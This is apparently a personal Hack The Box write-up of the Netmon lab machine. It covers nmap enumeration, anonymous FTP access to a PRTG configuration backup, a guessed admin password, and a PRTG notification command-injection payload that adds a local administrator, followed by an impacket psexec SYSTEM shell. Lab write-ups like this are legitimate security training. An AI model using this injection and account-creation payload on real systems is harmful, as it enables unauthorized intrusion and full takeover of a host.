---
title: "Netmon HTB"
date: 2024-07-17T16:51:04-07:00
draft: false
---

## Summary 
In this box we find and FTP server with Anonymous FTP login allowed. This will lead us to the credentials for admin access to an Paessler PRTG bandwidth monitor with the version PRTG/18.1.37.13946 found by nmap and later confirmed by the admin panel. This we find to be vulnerable CVE-2018-10253 with a CVSS 3.x score of 7.5 High. This will lead to the exploit that will get us "nt authoruty\system".

## Given 
IP=10.10.10.152

## Enumeration 

```sh
-[Wed Jul 17-14:30:20]-[jmk@parrot]-
-[~/Documents/Netmon]$ nmap -Pn -p- -oN nmap-p $IP --min-rate=1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 14:30 PDT
Nmap scan report for 10.10.10.152
Host is up (0.092s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

```

```sh
-[Wed Jul 17-14:31:45]-[jmk@parrot]-
-[~/Documents/Netmon]$ nmap -p 21,80,135,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV -v -oN nmap-sCV $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 14:35 PDT
<snip>
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_11-10-23  10:20AM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-07-17T21:36:12
|_  start_date: 2024-07-17T21:28:18
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

```

We see "ftp-anon: Anonymous FTP login allowed (FTP code 230)"
so lets login and see what is accessible

## FTP 
```sh
-[Wed Jul 17-14:36:20]-[jmk@parrot]-
-[~/Documents/Netmon]$ ftp $IP
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:jmk): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50054|)
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
<snip>
cd Public -> Users -> Desktop
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||50062|)
150 Opening ASCII mode data connection.
100% |*************************************************|    34        0.39 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (0.39 KiB/s)
<snip>
cd /programdata/Paessler/PRTG Network Monitor
<snip>
get 'PRTG Configuration.old.bak' 
exit

```
looking up where the PRTG Configuration [file](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) should be
```sh
-[Wed Jul 17-14:48:18]-[jmk@parrot]-
-[~/Documents/Netmon]$ cat user.txt
b53<snip>73e

```

looking inside 'PRTG Configuration.old.bak' 
note to self: in vim to [search](https://linuxize.com/post/vim-search/) use '/' and then type search pattern
press 'n' for next and 'N' for previous, for words `/\<words\>`
/db 
![dbuser-dbpass.png](/dbuser-dbpass.png)

this user and password will not work 
It should have been obvious to me to try a variation of the password like 
so prtgadmin:PrTg@dmin2019

## Web Admin 

so now that we are logged in we see the version information
![PRTG-Version.png](/PRTG-Version.png)

```sh
-[Wed Jul 17-15:32:47]-[jmk@parrot]-
-[~/Documents/Netmon]$ searchsploit PRTG 18.1.37
--
 Exploit Title           |  Path
----
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denia | windows_x86/dos/44500.py
----
Shellcodes: No Results


-[Wed Jul 17-15:41:11]-[jmk@parrot]-
-[~/Documents/Netmon]$ searchsploit --copy  windows_x86/dos/44500.py
  Exploit: PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)
      URL: https://www.exploit-db.com/exploits/44500
     Path: /usr/share/exploitdb/exploits/windows_x86/dos/44500.py
    Codes: CVE-2018-10253
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/jmk/Documents/Netmon/44500.py

```

note: CVE-2018-10253
![nist-cve-discription.png](/nist-cve-discription.png)

I could not get 44500.py to work, so I kept looking and found out the by setting up a notification in the admin dashboard I could run psexec.py and get sysadmin. 

the step to set up 
Setup -> Account Settings -> Notifications 
add new notification

Leave the default fields as they are and scroll tell "Execute Program" 
for "Program File" use "Demo exe notification -outfile.ps1"
and for "Parameter" use 
`abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add`
then save the file and and to the right of your notification click the edit icon and the bell so the trigger works 

Note to reader 
this part i got from the official write up. When I changed creeds to "jmk:jmk222!" And the file name to "mytest"
`jmk.txt | net user jmk jmk222! /add ; net localgroup administrators jmk /add`
I am not sure why it was not working maybe do to having made htb creeds first notification that i added? In the write-up there is a link to [this](https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/) they use `test.txt;net user pentest p3nT3st! /add`
so i must be making another mistake 

## System Admin 
```sh
 python psexec.py htb:'abc123!'@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file cXrYsDRc.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service pNwj on 10.10.10.152.....
[*] Starting service pNwj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authoruty\system
<snip>
C:\Users\Administrator\Desktop> type root.txt
6c9<snip>c27

```

